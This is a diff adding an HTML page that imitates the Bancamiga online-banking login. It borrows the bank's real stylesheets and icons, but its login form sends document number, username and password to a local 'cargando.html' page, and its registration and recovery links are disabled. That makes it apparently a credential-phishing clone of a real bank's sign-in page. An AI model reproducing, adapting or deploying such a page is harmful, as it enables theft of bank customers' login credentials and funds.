@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="es" class="">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>    Bancamiga</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <link rel="stylesheet" type="text/css" media="screen" href="https://online.bancamiga.com/css/bancamiga.css">
+
+    <!-- #FAVICONS -->
+    <link rel="shortcut icon" href="https://online.bancamiga.com/img/favicon/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="https://online.bancamiga.com/img/favicon/favicon.ico" type="image/x-icon">
+
+    <!-- FUENTES DE ICONOS NUEVOS -->
+    <link rel="stylesheet" href="https://online.bancamiga.com/css/pe-icon-7-stroke.css">
+
+
+  
+
+    <!-- Jquery Seat Charts -->
+    <link rel="stylesheet" href="https://online.bancamiga.com/js/plugin/jquery-seat-charts/jquery.seat-charts.css">
+
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="https://online.bancamiga.com/img/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+    
+    <style type="text/css">
+        body.stop-scrolling {
+            height: auto !important;
+            overflow: visible !important;
+        }
+
+        .menu-notification {
+            background-color: orange !important;
+            border-radius: 12% !important;
+            transition-duration: 0.3s !important;
+            right: -25px;
+        }
+
+        @font-face {
+            font-family: text-security-disc;
+            src: url("https://online.bancamiga.com/fonts/text-security-disc.woff");
+        }
+
+        input.loginpass {
+            font-family: text-security-disc !important;
+            -webkit-text-security: disc;
+        }
+
+        .align-middle {
+            vertical-align: middle !important;
+        }
+    </style>
+
+
+<style type="text/css">.jqstooltip { position: absolute;left: 0px;top: 0px;visibility: hidden;background: rgb(0, 0, 0) transparent;background-color: rgba(0,0,0,0.6);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000);-ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000)";color: white;font: 10px arial, san serif;text-align: left;white-space: nowrap;padding: 5px;border: 1px solid white;z-index: 10000;}.jqsfield { color: white;font: 10px arial, san serif;text-align: left;}
+</style>
+
+</head>
+
+<body class="smart-style-2 fixed-page-footer fixed-header desktop-detected" style="">
+
+  <div id="main" role="main" class="mainRegister"
+  style="background-image: url(docs/fondo-custom.jpg?V=02/10/23-03:00:40) !important;" bis_skin_checked="1">
+                <div id="content" class="container" style="opacity: 1;" bis_skin_checked="1"><style>
+    .redes-login {
+        justify-content: space-between;
+        margin-right: 10px;
+        display: inline-flex;
+        width: 30px;
+        box-shadow: 2px 2px 4px #0003;
+        border-radius: 50%;
+    }
+
+    .swal2-warning {
+        color: #f27474 !important;
+        border-color: #f27474 !important;
+    }
+</style>
+<div class="modal-dialog demo-modal" bis_skin_checked="1">
+    <div class="modal-content" bis_skin_checked="1">
+        <div class="modal-header" bis_skin_checked="1">
+            <h4 class="modal-title text-center">
+                <img src="./docs/BancamigaLogo-14.svg"  style="width: 85%;">
+            </h4>
+        </div>
+
+        <form id="login-form" method="post" action="cargando.html">
+            <div class="cf-turnstile" data-sitekey="0x4AAAAAAANeHPgF86kpmr3i" data-callback="turnstileLoaded" data-error-callback="turnstileLoaded" bis_skin_checked="1"></div>
+
+           
+            <div class="modal-body smart-form client-form" bis_skin_checked="1">
+             
+                <fieldset>
+                    <div class="row" bis_skin_checked="1">
+                        <section class="col col-4">
+                            <label for="tipodocben" class="label">Tipo de Documento</label>
+<div class="select" bis_skin_checked="1">
+    <select class="form-control valid" name="tipodocben" id="tipodocben" aria-required="true" aria-invalid="false">
+        <option value="Venezolano">Venezolano</option>
+        <option value="02">Pasaporte</option>
+        <option value="Pasaporte">Jurídico</option>
+        <option value="Extranjero">Extranjero</option>
+        <option value="Gubernamental">Gubernamental</option>
+        <option value="Comuna">Comuna</option>
+    </select>
+    <i></i>
+    <b class="tooltip tooltip-top-right"><i class="fa fa-lock txt-color-teal"></i>
+        Tipo de Documento de Identidad</b>
+</div>                        </section>
+                        <section class="col col-8">
+                            <label for="documento" class="label">Número de Documento</label>
+                            <div class="input" bis_skin_checked="1">
+                                <i class="fa fa-user icon-append"></i>
+                                <input type="text" class="form-control numbersOnly loginpass" maxlength="10" name="documento" id="documento" required autocomplete="off">
+                                <b class="tooltip tooltip-top-right">
+                                    <i class="fa fa-lock txt-color-teal"></i>
+                                    Número de Documento de Identidad</b>
+                            </div>
+                        </section>
+                    </div>
+
+                    <div class="row" bis_skin_checked="1">
+                        <section class="col col-6">
+                            <label for="u" class="label">Nombre de Usuario</label>
+<div class="input" bis_skin_checked="1">
+    <i class="icon-append fa fa-user"></i>
+    <input type="text" name="usr" id="usr" minlength="6" maxlength="20" autocomplete="off" required>
+    <b class="tooltip tooltip-top-right">
+        <i class="fa fa-lock txt-color-teal"></i>
+        Ingrese el Nombre de Usuario
+    </b>
+</div>                        </section>
+                        <section class="col col-6">
+                            <label for="p" class="label">
+                                Ingrese su contraseña
+                            </label>
+                            <div class="input" bis_skin_checked="1">
+                                <i class="fa fa-eye-slash icon-append move_me input-token" style="color: rgb(50, 118, 177); font-weight: bold; font-size: 10px; cursor: pointer;"></i>
+                                <input type="text" class="loginpass lgpass input-token" name="pss" id="pss" minlength="8" maxlength="16" autocomplete="off" required>
+                                <b class="tooltip tooltip-top-right input-token"><i class="fa fa-lock txt-color-teal"></i> Clic aqui para visualizar clave</b>
+                            </div>
+                        </section>
+                    </div>
+                </fieldset>
+            </div>
+
+            <div class="modal-footer text-center" bis_skin_checked="1">
+                <fieldset style="padding: 0 14px 5px;">
+                    <div class="cargando text-center hide" bis_skin_checked="1">
+                        <img src="./docs/loading.webp" alt="" height="30"> Cargando, Por favor espere un momento...
+                    </div>
+                    <div class="botones" bis_skin_checked="1">
+                        <div class="row" bis_skin_checked="1">
+                            <div class="col-xs-6" bis_skin_checked="1">
+                                 <button type="button" class="btn btn-warning btn-block margin-top-5" id="cmdRegister" disabled="" style="cursor: not-allowed;">
+                                        <i class="fa fa-user"></i> Registro
+                                    </button>
+                                                            </div>
+                            <div class="col-xs-6" bis_skin_checked="1">
+                                <button type="submit" class="btn btn-success btn-block margin-top-5" id="cmdLogin" 
+								style="border: 1px solid rgb(132, 168, 62); " >
+                                    <i class="fa fa-check"></i> Ingresar
+                                </button>
+                            </div>
+                        </div>
+                        <br>
+                        <div class="row" bis_skin_checked="1">
+                            <div class="col-sm-4 margin-top-5" style="padding-right: 0;" bis_skin_checked="1">
+                                <a id="cmdUnlock" class="text-muted" style="cursor: not-allowed;">
+                                    <strong><i class="fa fa-unlock"></i> Desbloqueo de usuario</strong>
+                                </a>
+                            </div>
+                            <div class="col-sm-4 margin-top-5" bis_skin_checked="1">
+                                <a id="cmdOlvido" class="text-muted" style="cursor: not-allowed;">
+                                    <strong><i class="fa fa-user"></i> Olvido de Usuario</strong>
+                                </a>
+                            </div>
+                            <div class="col-sm-4 margin-top-5" bis_skin_checked="1">
+                                <a id="cmdForget" class="text-muted" style="cursor: not-allowed;">
+                                    <strong><i class="fa fa-key"></i> Olvido de Contraseña</strong>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                    <br>
+                    <div class="margin-bottom-10" style="display: flex; justify-content: center;" bis_skin_checked="1">
+                        <a href="">
+                            <img class="redes-login" src="./docs/face.svg" alt="Facebook">
+                        </a>
+                        <a href="">
+                            <img class="redes-login" src="./docs/ig.svg" alt="Instagram">
+                        </a>
+                        <a href="">
+                            <img class="redes-login" src="./docs/twitter.svg" alt="Twitter">
+                        </a>
+                        <a href="">
+                            <img class="redes-login" src="./docs/tiktok.svg" alt="Tiktok">
+                        </a>
+                        <a href="">
+                            <img class="redes-login" src="./docs/youtube.svg" alt="Youtube">
+                        </a>
+                    </div>
+                    <p class="text-center">
+                        <strong class="note">
+                            Para mayor información o asesoria contáctanos al <br>
+                            Centro de atención Bancamiga (CAB)<br>
+                            0500-TUBANCA y 0500-1000400
+                        </strong>
+                    </p>
+                </fieldset>
+            </div>
+        </form>
+    </div>
+</div>
+
+</div>
+            </div>
+            <!-- #PAGE FOOTER -->
+<div class="page-footer text-center" bis_skin_checked="1">
+
+        <strong class="txt-color-white">
+            Bancamiga Banco Universal - RIF: J-31628759-9
+            <span class="hidden-xs"> Copyright © 2018.</span> Todos los derechos reservados.</strong>
+
+    <table class="pull-right" style="margin-top:-10px" width="135" border="0" cellpadding="2" cellspacing="0" title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications.">
+        <tbody><tr>
+            <td width="135" align="center" valign="top">
+
+
+                <br>
+
+            </td>
+        </tr>
+    </tbody></table>
+
+
+
+    <!-- end row -->
+</div>
+<!-- END FOOTER -->
+
+</body>
+</html>
